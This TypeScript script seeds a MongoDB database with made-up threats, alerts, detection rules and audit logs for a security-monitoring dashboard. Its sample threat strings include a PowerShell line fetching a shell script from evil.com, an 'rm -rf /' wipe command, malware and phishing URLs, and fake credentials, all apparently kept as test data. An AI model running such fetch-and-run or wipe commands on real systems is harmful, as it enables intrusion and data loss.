import mongoose from 'mongoose';
import dotenv from 'dotenv';
import path from 'path';

// Load env
dotenv.config({ path: path.resolve(__dirname, '../.env.local') });

const MONGODB_URI = process.env.MONGODB_URI!;
if (!MONGODB_URI) { console.error('MONGODB_URI not set'); process.exit(1); }

// ─── Inline schemas (avoid Next.js import issues) ────────────────────────

const ThreatSchema = new mongoose.Schema({
    type: { type: String, enum: ['text', 'url', 'image'], required: true },
    originalContent: String,
    anonymizedContent: { type: String, required: true },
    riskScore: { type: Number, required: true },
    categories: [String],
    confidence: { type: Number, required: true },
    explanation: { type: String, required: true },
    severity: { type: String, enum: ['low', 'medium', 'high', 'critical'], required: true },
    orgId: { type: String, required: true },
    userId: { type: String, required: true },
    ipAddress: String,
    countryCode: String,
}, { timestamps: true });

const AlertSchema = new mongoose.Schema({
    threatId: { type: String, required: true },
    title: { type: String, required: true },
    description: { type: String, required: true },
    severity: { type: String, enum: ['low', 'medium', 'high', 'critical'], required: true },
    status: { type: String, enum: ['open', 'dismissed', 'escalated', 'resolved'], default: 'open' },
    suggestedActions: [String],
    orgId: { type: String, required: true },
    assignedTo: String,
    resolvedBy: String,
    resolvedAt: Date,
}, { timestamps: true });

const RuleSchema = new mongoose.Schema({
    name: { type: String, required: true },
    description: String,
    conditions: [{ field: String, operator: String, value: mongoose.Schema.Types.Mixed }],
    conditionLogic: { type: String, enum: ['AND', 'OR'], default: 'AND' },
    actions: [{ type: { type: String }, payload: String }],
    orgId: { type: String, required: true },
    isActive: { type: Boolean, default: true },
    createdBy: { type: String, required: true },
    triggeredCount: { type: Number, default: 0 },
    hitRate: { type: Number, default: 0 },
    falsePositiveRate: { type: Number, default: 0 },
    lastTriggered: Date,
}, { timestamps: true });

const AuditLogSchema = new mongoose.Schema({
    actor: { type: String, required: true },
    actorEmail: { type: String, required: true },
    action: { type: String, required: true },
    target: String,
    metadata: mongoose.Schema.Types.Mixed,
    orgId: { type: String, required: true },
    ipAddress: String,
}, { timestamps: true });

const Threat = mongoose.models.Threat || mongoose.model('Threat', ThreatSchema);
const Alert = mongoose.models.Alert || mongoose.model('Alert', AlertSchema);
const Rule = mongoose.models.Rule || mongoose.model('Rule', RuleSchema);
const AuditLog = mongoose.models.AuditLog || mongoose.model('AuditLog', AuditLogSchema);

// ─── Helpers ─────────────────────────────────────────────────────

const pick = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
const rand = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;
const daysAgo = (d: number) => new Date(Date.now() - d * 86400000);

const ORG = 'org-sentinel-001';
const USERS = ['user-001', 'user-002', 'user-003', 'user-004', 'user-005'];
const EMAILS = ['s.jenkins@corp.com', 'm.ross@corp.com', 'e.gilbert@corp.com', 'd.kim@corp.com', 'a.patel@corp.com'];
const IPS = ['192.168.1.45', '10.0.0.22', '172.16.0.5', '203.0.113.42', '198.51.100.7'];
const COUNTRIES = ['US', 'CN', 'RU', 'DE', 'BR', 'IN', 'GB', 'KR'];

const TEXT_THREATS = [
    'Urgent: Verify your account immediately by clicking the link below',
    'Your SSN 123-45-6789 has been compromised. Send payment via Bitcoin.',
    'Download the attached invoice.exe for your recent purchase',
    'Employee salary data: John $125k, Sarah $140k, Mike $98k',
    'Password reset: admin/admin123 — do not share',
    'Wire $50,000 to account IBAN DE89 3704 before end of business',
    'Encrypted payload detected: base64(rm -rf / --no-preserve-root)',
    'Internal credentials leaked: API_KEY=sk-proj-abc123xyz',
    'Suspicious PowerShell: Invoke-WebRequest -Uri http://evil.com/shell.ps1',
    'Credit card: 4532-XXXX-XXXX-7890 exp 12/27 CVV 123',
];

const URL_THREATS = [
    'https://phishing-site.evil.com/login?redirect=bank',
    'http://malware-download.ru/trojan.exe',
    'https://bit.ly/3xF4k3L1nk',
    'http://192.168.1.1:8080/admin/shell',
    'https://fake-microsoft-365.com/oauth/authorize',
    'http://darkweb-market.onion/credentials',
    'https://tinyurl.com/y2x9f3k8',
    'http://evil-cdn.net/keylogger.js',
];

const IMAGE_THREATS = [
    'screenshot_credentials.png',
    'passport_scan_leaked.jpg',
    'classified_document_photo.png',
    'whiteboard_with_passwords.jpg',
    'server_room_access_codes.png',
];

const CATEGORIES = ['phishing', 'malware', 'data_exfiltration', 'social_engineering', 'insider_threat', 'ransomware', 'credential_theft', 'pii_exposure'];

const RULE_DEFS = [
    { name: 'Block Critical Phishing', description: 'Auto-block emails containing phishing keywords', conditions: [{ field: 'text', operator: 'contains', value: 'verify account' }], actions: [{ type: 'blockContent' }] },
    { name: 'Flag Suspicious URLs', description: 'Flag URL shorteners commonly used for phishing', conditions: [{ field: 'url', operator: 'matches', value: 'bit.ly|tinyurl.com' }], actions: [{ type: 'notifyAdmin' }] },
    { name: 'High Risk Auto-Escalate', description: 'Escalate threats with risk score above 80', conditions: [{ field: 'riskScore', operator: 'greaterThan', value: 80 }], actions: [{ type: 'escalate' }] },
    { name: 'PII Data Lock', description: 'Lock user when PII exposure is detected', conditions: [{ field: 'category', operator: 'equals', value: 'pii_exposure' }], actions: [{ type: 'lockUser' }] },
    { name: 'Ransomware Alert', description: 'Critical alert on ransomware signatures', conditions: [{ field: 'category', operator: 'equals', value: 'ransomware' }], actions: [{ type: 'markCritical' }, { type: 'notifyAdmin' }] },
    { name: 'Credential Theft Monitor', description: 'Monitor for credential theft attempts', conditions: [{ field: 'text', operator: 'contains', value: 'password' }], actions: [{ type: 'notifyAdmin' }] },
];

const AUDIT_ACTIONS = [
    'threat.scanned', 'alert.reviewed', 'alert.dismissed', 'alert.escalated',
    'rule.created', 'rule.toggled', 'user.suspended', 'user.reactivated',
    'login.success', 'login.failed', 'settings.updated', 'data.exported',
];

// ─── Seed Function ───────────────────────────────────────────────

async function seed() {
    console.log('Connecting to MongoDB...');
    await mongoose.connect(MONGODB_URI);
    console.log('Connected!\n');

    // Clear existing data
    await Promise.all([Threat.deleteMany({}), Alert.deleteMany({}), Rule.deleteMany({}), AuditLog.deleteMany({})]);
    console.log('Cleared existing data.\n');

    // ── Seed Threats (60) ──────────────────────────────────────
    const threats = [];
    for (let i = 0; i < 60; i++) {
        const type = pick(['text', 'text', 'text', 'url', 'url', 'image'] as const);
        const content = type === 'text' ? pick(TEXT_THREATS) : type === 'url' ? pick(URL_THREATS) : pick(IMAGE_THREATS);
        const riskScore = rand(15, 98);
        const severity = riskScore > 80 ? 'critical' : riskScore > 60 ? 'high' : riskScore > 35 ? 'medium' : 'low';
        threats.push({
            type,
            originalContent: content,
            anonymizedContent: content.replace(/\d{3}-\d{2}-\d{4}/g, 'XXX-XX-XXXX').replace(/\d{4}-\w{4}-\w{4}-\d{4}/g, 'XXXX-XXXX-XXXX-XXXX'),
            riskScore,
            categories: [pick(CATEGORIES), ...(Math.random() > 0.6 ? [pick(CATEGORIES)] : [])],
            confidence: rand(65, 99),
            explanation: `AI detected ${severity}-severity ${type} threat with ${riskScore}% risk. ${type === 'text' ? 'Content analysis flagged suspicious patterns.' : type === 'url' ? 'URL reputation check failed.' : 'Image OCR detected sensitive data.'}`,
            severity,
            orgId: ORG,
            userId: pick(USERS),
            ipAddress: pick(IPS),
            countryCode: pick(COUNTRIES),
            createdAt: daysAgo(rand(0, 30)),
        });
    }
    const insertedThreats = await Threat.insertMany(threats);
    console.log(`Seeded ${insertedThreats.length} threats.`);

    // ── Seed Alerts (15) ───────────────────────────────────────
    const alertData = insertedThreats.filter(t => (t as any).riskScore > 55).slice(0, 15).map((t: any) => ({
        threatId: t._id.toString(),
        title: `${t.severity.toUpperCase()} ${t.type} threat detected`,
        description: t.explanation,
        severity: t.severity,
        status: pick(['open', 'open', 'open', 'escalated', 'dismissed', 'resolved'] as const),
        suggestedActions: ['Review content', 'Block source IP', 'Notify SOC team'],
        orgId: ORG,
        assignedTo: Math.random() > 0.5 ? pick(EMAILS) : undefined,
        createdAt: t.createdAt,
    }));
    const insertedAlerts = await Alert.insertMany(alertData);
    console.log(`Seeded ${insertedAlerts.length} alerts.`);

    // ── Seed Rules (6) ─────────────────────────────────────────
    const rules = RULE_DEFS.map(r => ({
        ...r,
        conditionLogic: 'AND',
        orgId: ORG,
        isActive: Math.random() > 0.15,
        createdBy: pick(USERS),
        triggeredCount: rand(10, 450),
        hitRate: rand(40, 98),
        falsePositiveRate: rand(1, 25),
        lastTriggered: daysAgo(rand(0, 7)),
        createdAt: daysAgo(rand(10, 60)),
    }));
    const insertedRules = await Rule.insertMany(rules);
    console.log(`Seeded ${insertedRules.length} rules.`);

    // ── Seed Audit Logs (30) ───────────────────────────────────
    const logs = [];
    for (let i = 0; i < 30; i++) {
        const uid = rand(0, USERS.length - 1);
        logs.push({
            actor: USERS[uid],
            actorEmail: EMAILS[uid],
            action: pick(AUDIT_ACTIONS),
            target: Math.random() > 0.4 ? `threat-${rand(1, 60)}` : undefined,
            metadata: { source: pick(['dashboard', 'api', 'automated']), duration: `${rand(50, 3000)}ms` },
            orgId: ORG,
            ipAddress: pick(IPS),
            createdAt: daysAgo(rand(0, 14)),
        });
    }
    const insertedLogs = await AuditLog.insertMany(logs);
    console.log(`Seeded ${insertedLogs.length} audit logs.`);

    console.log('\nSeed complete! You can now use the admin dashboard.');
    process.exit(0);
}

seed().catch(err => { console.error('Seed failed:', err); process.exit(1); });
